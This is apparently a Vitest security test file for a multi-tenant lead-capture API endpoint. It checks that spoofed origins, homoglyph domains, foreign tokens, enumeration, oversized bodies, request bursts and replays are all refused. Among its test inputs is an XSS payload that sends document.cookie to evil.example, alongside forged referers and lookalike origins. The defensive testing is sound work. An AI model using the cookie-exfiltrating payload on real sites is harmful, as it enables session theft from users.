// @vitest-environment node
/**
 * The capture endpoint, driven by somebody who wants it to do something it
 * should not.
 *
 * `capture-route.test.ts` next door proves the endpoint works. This file
 * assumes it does and asks the other question: a generated client site is
 * static HTML on a box we run, its source is public, and the token in it is
 * readable by anyone who views source. So every request in this file is one a
 * person with that token and a text editor can actually send — from another
 * client's site, from a script with no browser behind it, from a page whose
 * domain looks like the client's until you read the bytes.
 *
 * THE STANDING ASSERTION, made in every case: the response is a refusal (or a
 * refusal wearing a 201, for the honeypot and the replay) and `leads` is
 * empty. A row in another client's workspace is the failure this endpoint
 * exists to prevent, so "nothing was written" is checked even where the status
 * code already says so.
 *
 * WHAT IS DELIBERATELY NOT DEFENDED HERE, because a test that pretended
 * otherwise would be worse than no test. `Origin` and `Referer` are set by a
 * browser and cannot be set by a page, so they stop a browser on somebody
 * else's page. They do not stop `curl`, which can send any header it likes —
 * and does not need to forge one anyway, because it holds the token. What
 * bounds a caller in that position is the token's capability (create one lead
 * in one workspace, read nothing), the per-token and per-address rates, and
 * the replay window. Those are the cases at the bottom of this file, and they
 * are the ones that matter for a site that has actually been compromised. See
 * `docs/security/client-site-ingress.md`.
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { NextRequest } from 'next/server';
import { OPTIONS, POST } from '../[token]/route';
import { createFakeSupabase } from '@/lib/flowstarter/__tests__/fake-supabase';
import {
  DEFAULT_LEAD_CAPTURE_LIMITS,
  leadCaptureOrigins,
  originAllowed,
  requestOrigin,
  rotateLeadCaptureToken,
} from '@/lib/flowstarter/lead-capture';

vi.mock('server-only', () => ({}));

const WORKSPACE_A = '0f4e1088-8d8f-4f18-83b1-406cc292b23c';
const WORKSPACE_B = '7c2a91b4-3d5e-4a17-9f88-1b2c3d4e5f60';
const PREVIEW_ID = '3a5b7c9d-1e2f-4a3b-8c5d-6e7f8a9b0c1d';

/** Salon Elena's token — the one in her site's page source. */
const TOKEN_A = 'a'.repeat(43);
/** Halden Roe's token. A different client, on the same platform. */
const TOKEN_B = 'b'.repeat(43);
/** Well-formed, and belonging to nobody. */
const TOKEN_UNKNOWN = 'z'.repeat(43);

const ORIGIN_A = 'https://salon-elena.flowstarter.test';
const ORIGIN_B = 'https://halden-roe.flowstarter.test';
const ORIGIN_EVIL = 'https://evil.example';

const db = createFakeSupabase();
vi.mock('@/supabase-clients/server', () => ({
  createSupabaseServiceRoleClient: () => db.client,
}));

const notify = vi.hoisted(() => ({ notifyClientOnce: vi.fn() }));
vi.mock('@/lib/flowstarter/client-notifications', () => ({
  notifyClientOnce: notify.notifyClientOnce,
}));

/**
 * A limiter that actually counts, rather than one that always says no.
 *
 * `INCR` then `count > limit` is precisely what `consumeRateLimit` does
 * against Upstash, so the burst and the replay cases below exercise the rule
 * the deployed endpoint runs on rather than a stub that agrees with them. The
 * map is cleared between tests, which is the only thing a shared in-memory
 * limiter needs for one test not to spend another's allowance.
 */
const limiter = vi.hoisted(() => {
  const hits = new Map<string, number>();
  return {
    hits,
    consumeRateLimit: vi.fn(
      async (key: string, config: { limit: number }): Promise<boolean> => {
        const next = (hits.get(key) ?? 0) + 1;
        hits.set(key, next);
        return next > config.limit;
      }
    ),
  };
});
vi.mock('@/lib/rate-limit', () => ({
  consumeRateLimit: limiter.consumeRateLimit,
}));

const enquiry = {
  name: 'Elena Popescu',
  email: 'elena@salon.ro',
  message: 'Doresc o programare pentru vineri',
  phone: '+40712345678',
  page: '/contact',
};

function post(
  token: string,
  payload: unknown,
  headers: Record<string, string> = { origin: ORIGIN_A },
  raw?: string | ReadableStream<Uint8Array>
): NextRequest {
  const body = raw ?? JSON.stringify(payload);
  const init = {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...headers },
    body,
    // Required by undici for a streamed body; harmless for a string. Not in
    // the DOM `RequestInit` this package's lib targets, hence the cast.
    ...(typeof body === 'string' ? {} : { duplex: 'half' }),
  };
  return new NextRequest(
    `http://localhost/api/leads/capture/${token}`,
    init as ConstructorParameters<typeof NextRequest>[1]
  );
}

function preflight(token: string, origin: string): NextRequest {
  return new NextRequest(`http://localhost/api/leads/capture/${token}`, {
    method: 'OPTIONS',
    headers: { origin },
  });
}

const params = (token: string) => ({ params: Promise.resolve({ token }) });

/** Status, body and every header, so "identical" means identical. */
async function fingerprintOf(response: Response) {
  const headers: [string, string][] = [];
  response.headers.forEach((value, name) => headers.push([name, value]));
  return {
    status: response.status,
    body: await response.text(),
    headers: headers.sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0)),
  };
}

beforeEach(() => {
  db.reset();
  limiter.hits.clear();
  limiter.consumeRateLimit.mockClear();
  notify.notifyClientOnce.mockReset();
  notify.notifyClientOnce.mockResolvedValue({ sent: true });
  process.env.PLATFORM_DOMAIN = 'flowstarter.test';
  db.seed('workspaces', [
    {
      id: WORKSPACE_A,
      slug: 'salon-elena',
      client_email: 'elena@example.com',
      claimed_preview_id: PREVIEW_ID,
      lead_capture_token: TOKEN_A,
    },
    {
      id: WORKSPACE_B,
      slug: 'halden-roe',
      client_email: null,
      claimed_preview_id: null,
      lead_capture_token: TOKEN_B,
    },
  ]);
  db.seed('workspace_hosts', [
    { workspace_id: WORKSPACE_A, hostname: 'salonelena.ro' },
  ]);
});

// ── Tokens that are not this site's ────────────────────────────────────────

describe('a token that does not belong to the site presenting it', () => {
  it('refuses another workspace token used on this site, and writes nothing', async () => {
    // The shape of one client reading another's page source: the token is
    // real, it just is not this origin's.
    const response = await POST(
      post(TOKEN_B, enquiry, { origin: ORIGIN_A }),
      params(TOKEN_B)
    );
    expect(response.status).toBe(404);
    expect(await response.json()).toEqual({
      ok: false,
      message: 'This form is not connected yet.',
    });
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses a well-formed token that belongs to nobody', async () => {
    const response = await POST(
      post(TOKEN_UNKNOWN, enquiry),
      params(TOKEN_UNKNOWN)
    );
    expect(response.status).toBe(404);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses a preview token without reading anything', async () => {
    const token = `preview.${PREVIEW_ID}`;
    const response = await POST(post(token, enquiry), params(token));
    expect(response.status).toBe(403);
    expect((await response.json()).message).toContain('preview');
    expect(db.rows('leads')).toHaveLength(0);
    // Before the database, so a preview token cannot be used to make the
    // endpoint do work on somebody's behalf.
    expect(limiter.consumeRateLimit).not.toHaveBeenCalled();
  });

  it('refuses a workspace id offered as a token', async () => {
    const response = await POST(
      post(WORKSPACE_A, enquiry),
      params(WORKSPACE_A)
    );
    expect(response.status).toBe(404);
    expect(db.rows('leads')).toHaveLength(0);
  });
});

// ── Origins that are not this workspace's ──────────────────────────────────

describe('the origin a submission claims to come from', () => {
  it('refuses another client site posting a scraped token', async () => {
    const response = await POST(
      post(TOKEN_A, enquiry, { origin: ORIGIN_B }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(404);
    expect(response.headers.get('Access-Control-Allow-Origin')).toBeNull();
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses a non-browser client that sends no origin at all', async () => {
    const response = await POST(
      post(TOKEN_A, enquiry, { 'user-agent': 'curl/8.7.1' }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(404);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses Origin: null, which is what a sandboxed frame sends', async () => {
    const response = await POST(
      post(TOKEN_A, enquiry, { origin: 'null' }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(404);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses a Referer that only mentions the real site', async () => {
    // Every shape of "the allowed origin appears somewhere in this URL".
    // `new URL` decides the host, so a path, a query, a fragment and a
    // userinfo section are all just characters that are not the host.
    const forgeries = [
      `${ORIGIN_EVIL}/${ORIGIN_A}`,
      `${ORIGIN_EVIL}/?next=${encodeURIComponent(ORIGIN_A)}`,
      `${ORIGIN_EVIL}/#${ORIGIN_A}`,
      'https://salon-elena.flowstarter.test@evil.example/contact',
      'https://salon-elena.flowstarter.test.evil.example/contact',
      'https://evil.example.salon-elena.flowstarter.test.evil.example/',
    ];
    for (const referer of forgeries) {
      db.reset();
      db.seed('workspaces', [
        {
          id: WORKSPACE_A,
          slug: 'salon-elena',
          client_email: null,
          claimed_preview_id: null,
          lead_capture_token: TOKEN_A,
        },
      ]);
      const response = await POST(
        post(TOKEN_A, enquiry, { referer }),
        params(TOKEN_A)
      );
      expect(response.status).toBe(404);
      expect(db.rows('leads')).toHaveLength(0);
    }
  });

  it('refuses a homoglyph of the workspace own domain', async () => {
    // What a browser on a look-alike domain actually puts in `Origin`: the
    // punycode, because a header is a byte string and cannot carry the
    // Cyrillic а (U+0430) the registrant bought. Refused because the allow
    // list holds ASCII hostnames derived from the workspace's own slug, and
    // `xn--slon-elena-zqi` is not `salon-elena` however it looks in a tab.
    const lookalikes = [
      // s-{Cyrillic а}-lon-elena.flowstarter.test
      'https://xn--slon-elena-zqi.flowstarter.test',
      // salon-elena.flowst-{Cyrillic а}-rter.test
      'https://salon-elena.xn--flowstrter-4qi.test',
      // s-{å}-lon-elena.flowstarter.test
      'https://xn--slon-elena-15a.flowstarter.test',
    ];
    for (const origin of lookalikes) {
      db.reset();
      db.seed('workspaces', [
        {
          id: WORKSPACE_A,
          slug: 'salon-elena',
          client_email: null,
          claimed_preview_id: null,
          lead_capture_token: TOKEN_A,
        },
      ]);
      const response = await POST(
        post(TOKEN_A, enquiry, { origin }),
        params(TOKEN_A)
      );
      expect(response.status).toBe(404);
      expect(db.rows('leads')).toHaveLength(0);
    }
  });

  it('turns a unicode origin into its punycode before comparing it', async () => {
    // The rule, one level below the header, where the unicode form can
    // actually be expressed. This is what makes the three punycode strings
    // above the right ones to assert on: they are what the lookalike domains
    // normalise to, so nothing is being tested against a hand-typed constant.
    const cyrillicA = String.fromCharCode(0x0430);
    const allowed = leadCaptureOrigins({ slug: 'salon-elena' });
    expect(allowed).toContain(ORIGIN_A);

    const spoofed = requestOrigin({
      get: (name: string) =>
        name === 'origin'
          ? `https://s${cyrillicA}lon-elena.flowstarter.test`
          : null,
    });
    expect(spoofed).toBe('https://xn--slon-elena-zqi.flowstarter.test');
    expect(originAllowed(spoofed, allowed)).toBe(false);
  });

  it('refuses http where the site is only ever served over https', async () => {
    const response = await POST(
      post(TOKEN_A, enquiry, { origin: 'http://salon-elena.flowstarter.test' }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(404);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses the right host on a port we do not serve', async () => {
    const response = await POST(
      post(TOKEN_A, enquiry, {
        origin: 'https://salon-elena.flowstarter.test:8443',
      }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(404);
    expect(db.rows('leads')).toHaveLength(0);
  });
});

// ── Telling real tokens from invented ones ─────────────────────────────────

describe('enumeration', () => {
  it('answers unknown, rotated and foreign tokens byte for byte the same', async () => {
    // A caller holding a list of tokens scraped out of page source is asking
    // exactly one question: which of these are still live. All three answers
    // have to be the same answer or the endpoint has told them.
    const unknown = await fingerprintOf(
      await POST(post(TOKEN_UNKNOWN, enquiry), params(TOKEN_UNKNOWN))
    );

    const rotated = await (async () => {
      const before = TOKEN_A;
      const fresh = await rotateLeadCaptureToken(db.client as never, {
        workspaceId: WORKSPACE_A,
        actor: 'test',
      });
      expect(fresh?.token).toBeTruthy();
      expect(fresh?.token).not.toBe(before);
      return fingerprintOf(await POST(post(before, enquiry), params(before)));
    })();

    const foreign = await fingerprintOf(
      await POST(post(TOKEN_B, enquiry, { origin: ORIGIN_A }), params(TOKEN_B))
    );

    expect(rotated).toEqual(unknown);
    expect(foreign).toEqual(unknown);
    expect(unknown.status).toBe(404);
    // And no allow-origin on any of them, so a browser cannot read the body
    // to tell them apart either.
    expect(
      unknown.headers.find(([name]) => name === 'access-control-allow-origin')
    ).toBeUndefined();
  });

  it('gives a malformed token the same answer as a well-formed unknown one', async () => {
    const malformed = await fingerprintOf(
      await POST(post('nope', enquiry), params('nope'))
    );
    const unknown = await fingerprintOf(
      await POST(post(TOKEN_UNKNOWN, enquiry), params(TOKEN_UNKNOWN))
    );
    expect(malformed).toEqual(unknown);
  });
});

// ── Payloads ───────────────────────────────────────────────────────────────

describe('what a hostile body can carry', () => {
  const SCRIPT =
    '<img src=x onerror="fetch(`//evil.example?c=${document.cookie}`)">';

  it('refuses markup in every field that can never legitimately carry it', async () => {
    for (const field of ['name', 'email', 'phone', 'page'] as const) {
      db.reset();
      db.seed('workspaces', [
        {
          id: WORKSPACE_A,
          slug: 'salon-elena',
          client_email: null,
          claimed_preview_id: null,
          lead_capture_token: TOKEN_A,
        },
      ]);
      limiter.hits.clear();
      const response = await POST(
        post(TOKEN_A, { ...enquiry, [field]: SCRIPT }),
        params(TOKEN_A)
      );
      if (field === 'page') {
        // The page is telemetry the form fills in, not something a visitor
        // typed, so a hostile one is dropped and the enquiry still lands —
        // with no source on it.
        expect(response.status).toBe(201);
        expect(db.rows('leads')[0]?.['source']).toBeNull();
      } else {
        expect(response.status).toBe(400);
        expect(db.rows('leads')).toHaveLength(0);
      }
    }
  });

  it('refuses a body where every field at once is a script', async () => {
    const response = await POST(
      post(TOKEN_A, {
        name: SCRIPT,
        email: SCRIPT,
        phone: SCRIPT,
        message: SCRIPT,
        page: SCRIPT,
      }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(400);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('stores a message containing markup verbatim, for the renderer to escape', async () => {
    // Kept rather than mangled: `a < b` is a thing people write, and the
    // dashboard and the email both escape what they draw. The assertion that
    // they do is in `hostile-content-rendering.test.tsx`.
    const response = await POST(
      post(TOKEN_A, { ...enquiry, message: SCRIPT }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(201);
    expect(db.rows('leads')[0]?.['message']).toBe(SCRIPT);
  });

  it('refuses a NUL byte rather than handing one to Postgres', async () => {
    const response = await POST(
      post(TOKEN_A, {
        ...enquiry,
        message: `hello${String.fromCharCode(0)}world`,
      }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(400);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('strips the characters that make a name lie about itself', async () => {
    const rtlOverride = String.fromCharCode(0x202e);
    const zeroWidth = String.fromCharCode(0x200b);
    const response = await POST(
      post(TOKEN_A, {
        ...enquiry,
        name: `Elena${rtlOverride}${zeroWidth} Popescu`,
        message: `line one${String.fromCharCode(7)}line two`,
      }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(201);
    const lead = db.rows('leads')[0];
    expect(lead?.['name']).toBe('Elena Popescu');
    expect(lead?.['message']).toBe('line oneline two');
  });

  it('drops the keys the form never had, so a body cannot set a column', async () => {
    const response = await POST(
      post(TOKEN_A, {
        ...enquiry,
        status: 'new',
        workspace_id: WORKSPACE_B,
        id: 'chosen-by-the-caller',
      }),
      params(TOKEN_A)
    );
    expect(response.status).toBe(201);
    const lead = db.rows('leads')[0];
    expect(lead?.['workspace_id']).toBe(WORKSPACE_A);
    expect(lead?.['id']).not.toBe('chosen-by-the-caller');
  });

  it('refuses five megabytes before it parses any of them', async () => {
    const huge = JSON.stringify({
      ...enquiry,
      message: 'x'.repeat(5 * 1024 * 1024),
    });
    expect(huge.length).toBeGreaterThan(
      DEFAULT_LEAD_CAPTURE_LIMITS.maxBodyBytes
    );
    const response = await POST(
      post(TOKEN_A, null, { origin: ORIGIN_A }, huge),
      params(TOKEN_A)
    );
    expect(response.status).toBe(413);
    expect(db.rows('leads')).toHaveLength(0);
  });

  it('refuses an oversized chunked body that declares no length at all', async () => {
    // The case a `content-length` check alone waves through: no header to
    // read, so the cap has to be enforced on the bytes as they arrive.
    const chunk = new TextEncoder().encode('x'.repeat(16 * 1024));
    let sent = 0;
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (sent > 5 * 1024 * 1024) {
          controller.close();
          return;
        }
        sent += chunk.byteLength;
        controller.enqueue(chunk);
      },
    });
    const request = post(TOKEN_A, null, { origin: ORIGIN_A }, stream);
    expect(request.headers.get('content-length')).toBeNull();

    const response = await POST(request, params(TOKEN_A));
    expect(response.status).toBe(413);
    expect(db.rows('leads')).toHaveLength(0);
  });
});

// ── Volume ─────────────────────────────────────────────────────────────────

describe('volume', () => {
  it('refuses a burst past the per-token cap and stores only what it allowed', async () => {
    const allowed = DEFAULT_LEAD_CAPTURE_LIMITS.tokenPerMinute;
    const statuses: number[] = [];
    for (let i = 0; i <= allowed; i += 1) {
      // A different message each time, so the replay rule is not what stops
      // this: the case under test is volume, not repetition.
      const response = await POST(
        post(TOKEN_A, { ...enquiry, message: `Enquiry number ${i}` }),
        params(TOKEN_A)
      );
      statuses.push(response.status);
    }
    expect(statuses.filter((status) => status === 201)).toHaveLength(allowed);
    expect(statuses[statuses.length - 1]).toBe(429);
    expect(db.rows('leads')).toHaveLength(allowed);
  });

  it('counts the address our own edge appended, not the one the caller wrote', async () => {
    // `X-Forwarded-For: <forged>, <real>` — a limiter reading the front of
    // that list gives a fresh bucket to every forged value, which is a
    // per-request limit, which is no limit. The walk from the right is
    // `clientIp` (`lib/request-ip.ts`, PR #141); this asserts the capture
    // endpoint actually keys its limiter on that rather than on the raw
    // header, which is the half a unit test of the rule cannot cover.
    for (let i = 0; i < 3; i += 1) {
      await POST(
        post(
          TOKEN_A,
          { ...enquiry, message: `Enquiry ${i}` },
          {
            origin: ORIGIN_A,
            'x-forwarded-for': `10.0.0.${i}, 203.0.113.9`,
          }
        ),
        params(TOKEN_A)
      );
    }
    expect(limiter.hits.get('lead-capture:ip:203.0.113.9')).toBe(3);
    expect(limiter.hits.get('lead-capture:ip:10.0.0.0')).toBeUndefined();
  });

  it('stores a replayed payload once and answers both times identically', async () => {
    const first = await POST(post(TOKEN_A, enquiry), params(TOKEN_A));
    const second = await POST(post(TOKEN_A, enquiry), params(TOKEN_A));

    expect(await fingerprintOf(second)).toEqual(await fingerprintOf(first));
    expect(first.status).toBe(201);
    expect(db.rows('leads')).toHaveLength(1);
    // And the client is told about it once, not twice.
    expect(notify.notifyClientOnce).toHaveBeenCalledTimes(1);
  });

  it('lets a genuinely different second enquiry through', async () => {
    await POST(post(TOKEN_A, enquiry), params(TOKEN_A));
    const second = await POST(
      post(TOKEN_A, { ...enquiry, message: 'And one more thing' }),
      params(TOKEN_A)
    );
    expect(second.status).toBe(201);
    expect(db.rows('leads')).toHaveLength(2);
  });

  it('accepts the honeypot with the same 201 and writes no row', async () => {
    const trapped = await POST(
      post(TOKEN_A, { ...enquiry, company_website: 'http://spam.example' }),
      params(TOKEN_A)
    );
    expect(trapped.status).toBe(201);
    expect(await trapped.json()).toEqual({ ok: true });
    expect(db.rows('leads')).toHaveLength(0);
    expect(notify.notifyClientOnce).not.toHaveBeenCalled();
  });
});

// ── Preflight ──────────────────────────────────────────────────────────────

describe('the CORS preflight', () => {
  it('hands no allow-origin to a foreign page, for a token that is real', async () => {
    for (const origin of [ORIGIN_EVIL, ORIGIN_B, 'http://localhost:3000']) {
      const response = await OPTIONS(
        preflight(TOKEN_A, origin),
        params(TOKEN_A)
      );
      expect(response.status).toBe(204);
      expect(response.headers.get('Access-Control-Allow-Origin')).toBeNull();
    }
  });

  it('hands no allow-origin for another workspace token, from either origin', async () => {
    for (const origin of [ORIGIN_A, ORIGIN_EVIL]) {
      const response = await OPTIONS(
        preflight(TOKEN_B, origin),
        params(TOKEN_B)
      );
      expect(response.headers.get('Access-Control-Allow-Origin')).toBeNull();
    }
  });

  it('never answers with a wildcard, even for the origin it allows', async () => {
    const response = await OPTIONS(
      preflight(TOKEN_A, ORIGIN_A),
      params(TOKEN_A)
    );
    expect(response.headers.get('Access-Control-Allow-Origin')).toBe(ORIGIN_A);
    expect(response.headers.get('Vary')).toBe('Origin');
  });

  it('stops answering a caller who walks tokens through the preflight', async () => {
    // The cheaper half of the endpoint, and the more useful one to somebody
    // testing a list: a preflight that came back with an allow-origin would
    // confirm a token without a body ever being sent. So it is counted on the
    // same per-address budget the POST is.
    const allowed = DEFAULT_LEAD_CAPTURE_LIMITS.ipPerMinute;
    for (let i = 0; i <= allowed; i += 1) {
      await OPTIONS(preflight(TOKEN_A, ORIGIN_A), params(TOKEN_A));
    }
    const last = await OPTIONS(preflight(TOKEN_A, ORIGIN_A), params(TOKEN_A));
    expect(last.status).toBe(204);
    expect(last.headers.get('Access-Control-Allow-Origin')).toBeNull();
  });
});
